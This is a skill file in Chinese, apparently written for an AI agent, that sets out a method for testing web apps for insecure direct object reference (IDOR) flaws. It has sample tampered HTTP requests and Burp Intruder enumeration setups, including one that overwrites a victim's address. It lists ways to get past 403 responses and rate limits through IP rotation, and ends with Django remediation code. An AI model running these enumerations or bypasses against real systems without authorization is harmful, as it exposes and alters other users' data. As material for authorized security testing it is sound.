---
name: idor-testing
description: "提供识别和利用 Web 应用中不安全直接对象引用（IDOR）漏洞的系统化方法论。当用户要求'IDOR测试'、'越权测试'、'不安全直接对象引用'、'水平越权检测'、'IDOR漏洞扫描'时使用。"
risk: offensive
source: community
author: zebbern
date_added: "2026-02-27"
---

> 仅限授权使用：本技能仅用于授权的安全评估、防御性验证或受控教学环境。

# IDOR 漏洞测试

## 目的

提供识别和利用 Web 应用中不安全直接对象引用（IDOR）漏洞的系统化方法论。本技能涵盖数据库对象引用和静态文件引用、基于参数篡改与枚举的检测技术、通过 Burp Suite 进行利用，以及防止未授权访问的修复策略。

## 输入 / 前提条件

- **目标 Web 应用**：包含用户专属资源的应用 URL
- **多个用户账户**：至少两个测试账户，用于验证跨用户访问
- **Burp Suite 或代理工具**：用于请求篡改的拦截代理
- **授权**：安全测试的书面许可
- **理解应用流程**：了解对象的引用方式（ID、文件名）

## 输出 / 交付物

- **IDOR 漏洞报告**：已发现的访问控制绕过文档
- **概念验证**：跨用户上下文的未授权数据访问证据
- **受影响端点**：存在漏洞的 API 端点和参数列表
- **影响评估**：数据暴露严重程度分级
- **修复建议**：针对已发现漏洞的具体修复方案

## 核心工作流

### 1. 理解 IDOR 漏洞类型

#### 直接引用数据库对象
当应用通过用户可控参数引用数据库记录时发生：
```
# Original URL (authenticated as User A)
example.com/user/profile?id=2023

# Manipulation attempt (accessing User B's data)
example.com/user/profile?id=2022
```

#### 直接引用静态文件
当应用暴露可枚举的文件路径或文件名时发生：
```
# Original URL (User A's receipt)
example.com/static/receipt/205.pdf

# Manipulation attempt (User B's receipt)
example.com/static/receipt/200.pdf
```

### 2. 侦察与准备

#### 创建多个测试账户
```
Account 1: "attacker" - Primary testing account
Account 2: "victim" - Account whose data we attempt to access
```

#### 识别对象引用
捕获并分析包含以下内容的请求：
- URL 中的数字 ID：`/api/user/123`
- 参数中的数字 ID：`?id=123&action=view`
- 请求体中的数字 ID：`{"userId": 123}`
- 文件路径：`/download/receipt_123.pdf`
- GUID/UUID：`/profile/a1b2c3d4-e5f6-...`

#### 映射用户 ID
```
# Access user ID endpoint (if available)
GET /api/user-id/

# Note ID patterns:
# - Sequential integers (1, 2, 3...)
# - Auto-incremented values
# - Predictable patterns
```

### 3. 检测技术

#### URL 参数篡改
```
# Step 1: Capture original authenticated request
GET /api/user/profile?id=1001 HTTP/1.1
Cookie: session=attacker_session

# Step 2: Modify ID to target another user
GET /api/user/profile?id=1000 HTTP/1.1
Cookie: session=attacker_session

# Vulnerable if: Returns victim's data with attacker's session
```

#### 请求体篡改
```
# Original POST request
POST /api/address/update HTTP/1.1
Content-Type: application/json
Cookie: session=attacker_session

{"id": 5, "userId": 1001, "address": "123 Attacker St"}

# Modified request targeting victim
{"id": 5, "userId": 1000, "address": "123 Attacker St"}
```

#### HTTP 方法切换
```
# Original GET request may be protected
GET /api/admin/users/1000 → 403 Forbidden

# Try alternative methods
POST /api/admin/users/1000 → 200 OK (Vulnerable!)
PUT /api/admin/users/1000 → 200 OK (Vulnerable!)
```

### 4. 使用 Burp Suite 进行利用

#### 手动利用
```
1. Configure browser proxy through Burp Suite
2. Login as "attacker" user
3. Navigate to profile/data page
4. Enable Intercept in Proxy tab
5. Capture request with user ID
6. Modify ID to victim's ID
7. Forward request
8. Observe response for victim's data
```

#### 使用 Intruder 自动枚举
```
1. Send request to Intruder (Ctrl+I)
2. Clear all payload positions
3. Select ID parameter as payload position
4. Configure attack type: Sniper
5. Payload settings:
   - Type: Numbers
   - Range: 1 to 10000
   - Step: 1
6. Start attack
7. Analyze responses for 200 status codes
```

#### 多位置 Battering Ram 攻击
```
# When same ID appears in multiple locations
PUT /api/addresses/§5§/update HTTP/1.1

{"id": §5§, "userId": 3}

Attack Type: Battering Ram
Payload: Numbers 1-1000
```

### 5. 常见 IDOR 位置

#### API 端点
```
/api/user/{id}
/api/profile/{id}
/api/order/{id}
/api/invoice/{id}
/api/document/{id}
/api/message/{id}
/api/address/{id}/update
/api/address/{id}/delete
```

#### 文件下载
```
/download/invoice_{id}.pdf
/static/receipts/{id}.pdf
/uploads/documents/{filename}
/files/reports/report_{date}_{id}.xlsx
```

#### 查询参数
```
?userId=123
?orderId=456
?documentId=789
?file=report_123.pdf
?account=user@email.com
```

## 快速参考

### IDOR 测试清单

| 测试项 | 方法 | 漏洞指标 |
|--------|------|----------|
| 递增/递减 ID | 将 `id=5` 改为 `id=4` | 返回其他用户的数据 |
| 使用受害者 ID | 替换为已知受害者 ID | 成功访问受害者资源 |
| 枚举范围 | 测试 ID 1-1000 | 发现其他用户的有效记录 |
| 负数值 | 测试 `id=-1` 或 `id=0` | 返回意外数据或错误 |
| 超大值 | 测试 `id=99999999` | 系统信息泄露 |
| 字符串 ID | 更改格式为 `id=user_123` | 逻辑绕过 |
| GUID 篡改 | 修改 UUID 部分 | UUID 模式可预测 |

### 响应分析

| 状态码 | 解读 |
|--------|------|
| 200 OK | 可能存在 IDOR — 验证数据归属 |
| 403 Forbidden | 访问控制正常 |
| 404 Not Found | 资源不存在 |
| 401 Unauthorized | 需要认证 |
| 500 Error | 可能存在输入验证问题 |

### 常见漏洞参数

| 参数类型 | 示例 |
|----------|------|
| 用户标识符 | `userId`、`uid`、`user_id`、`account` |
| 资源标识符 | `id`、`pid`、`docId`、`fileId` |
| 订单/交易 | `orderId`、`transactionId`、`invoiceId` |
| 消息/通信 | `messageId`、`threadId`、`chatId` |
| 文件引用 | `filename`、`file`、`document`、`path` |

## 约束与限制

### 操作边界
- 需要至少两个有效用户账户进行验证
- 部分应用使用会话绑定令牌而非 ID
- GUID/UUID 引用更难枚举，但并非不可能
- 速率限制可能限制枚举尝试
- 部分 IDOR 需要链式漏洞才能利用

### 检测挑战
- 水平越权（用户到用户）vs 垂直越权（用户到管理员）
- 盲注 IDOR：响应不确认访问
- 异步操作中的时间型 IDOR
- WebSocket 通信中的 IDOR

### 法律要求
- 仅测试已明确授权的应用
- 记录所有测试活动和发现
- 不得访问、修改或窃取真实用户数据
- 通过正规披露渠道报告发现

## 示例

### 示例 1：基本 ID 参数 IDOR
```
# Login as attacker (userId=1001)
# Navigate to profile page

# Original request
GET /api/profile?id=1001 HTTP/1.1
Cookie: session=abc123

# Response: Attacker's profile data

# Modified request (targeting victim userId=1000)
GET /api/profile?id=1000 HTTP/1.1
Cookie: session=abc123

# Vulnerable Response: Victim's profile data returned!
```

### 示例 2：地址更新端点中的 IDOR
```
# Intercept address update request
PUT /api/addresses/5/update HTTP/1.1
Content-Type: application/json
Cookie: session=attacker_session

{
  "id": 5,
  "userId": 1001,
  "street": "123 Main St",
  "city": "Test City"
}

# Modify userId to victim's ID
{
  "id": 5,
  "userId": 1000,  # Changed from 1001
  "street": "Hacked Address",
  "city": "Exploit City"
}

# If 200 OK: Address created under victim's account
```

### 示例 3：静态文件 IDOR
```
# Download own receipt
GET /api/download/5 HTTP/1.1
Cookie: session=attacker_session

# Response: PDF of attacker's receipt (order #5)

# Attempt to access other receipts
GET /api/download/3 HTTP/1.1
Cookie: session=attacker_session

# Vulnerable Response: PDF of victim's receipt (order #3)!
```

### 示例 4：Burp Intruder 枚举
```
# Configure Intruder attack
Target: PUT /api/addresses/§1§/update
Payload Position: Address ID in URL and body

Attack Configuration:
- Type: Battering Ram
- Payload: Numbers 0-20, Step 1

Body Template:
{
  "id": §1§,
  "userId": 3
}

# Analyze results:
# - 200 responses indicate successful modification
# - Check victim's account for new addresses
```

### 示例 5：水平到垂直越权
```
# Step 1: Enumerate user roles
GET /api/user/1 → {"role": "user", "id": 1}
GET /api/user/2 → {"role": "user", "id": 2}
GET /api/user/3 → {"role": "admin", "id": 3}

# Step 2: Access admin functions with discovered ID
GET /api/admin/dashboard?userId=3 HTTP/1.1
Cookie: session=regular_user_session

# If accessible: Vertical privilege escalation achieved
```

## 故障排除

### 问题：所有请求返回 403 Forbidden
**原因**：服务端已实现访问控制
**解决方案**：
```
# Try alternative attack vectors:
1. HTTP method switching (GET → POST → PUT)
2. Add X-Original-URL or X-Rewrite-URL headers
3. Try parameter pollution: ?id=1001&id=1000
4. URL encoding variations: %31%30%30%30 for "1000"
5. Case variations for string IDs
```

### 问题：应用使用 UUID 而非顺序 ID
**原因**：随机标识符降低了枚举风险
**解决方案**：
```
# UUID discovery techniques:
1. Check response bodies for leaked UUIDs
2. Search JavaScript files for hardcoded UUIDs
3. Check API responses that list multiple objects
4. Look for UUID patterns in error messages
5. Try UUID v1 (time-based) prediction if applicable
```

### 问题：会话令牌绑定到用户
**原因**：应用根据请求资源验证会话
**解决方案**：
```
# Advanced bypass attempts:
1. Test for IDOR in unauthenticated endpoints
2. Check password reset/email verification flows
3. Look for IDOR in file upload/download
4. Test API versioning: /api/v1/ vs /api/v2/
5. Check mobile API endpoints (often less protected)
```

### 问题：速率限制阻止枚举
**原因**：应用实现了请求限流
**解决方案**：
```
# Bypass techniques:
1. Add delays between requests (Burp Intruder throttle)
2. Rotate IP addresses (proxy chains)
3. Target specific high-value IDs instead of full range
4. Use different endpoints for same resources
5. Test during off-peak hours
```

### 问题：无法验证 IDOR 影响
**原因**：响应未明确指示数据归属
**解决方案**：
```
# Verification methods:
1. Create unique identifiable data in victim account
2. Look for PII markers (name, email) in responses
3. Compare response lengths between users
4. Check for timing differences in responses
5. Use secondary indicators (creation dates, metadata)
```

## 修复指南

### 实现正确的访问控制
```python
# Django example - validate ownership
def update_address(request, address_id):
    address = Address.objects.get(id=address_id)
    
    # Verify ownership before allowing update
    if address.user != request.user:
        return HttpResponseForbidden("Unauthorized")
    
    # Proceed with update
    address.update(request.data)
```

### 使用间接引用
```python
# Instead of: /api/address/123
# Use: /api/address/current-user/billing

def get_address(request):
    # Always filter by authenticated user
    address = Address.objects.filter(user=request.user).first()
    return address
```

### 服务端验证
```python
# Always validate on server, never trust client input
def download_receipt(request, receipt_id):
    receipt = Receipt.objects.filter(
        id=receipt_id,
        user=request.user  # Critical: filter by current user
    ).first()
    
    if not receipt:
        return HttpResponseNotFound()
    
    return FileResponse(receipt.file)
```

## 使用时机
本技能适用于执行概述中描述的工作流或操作。
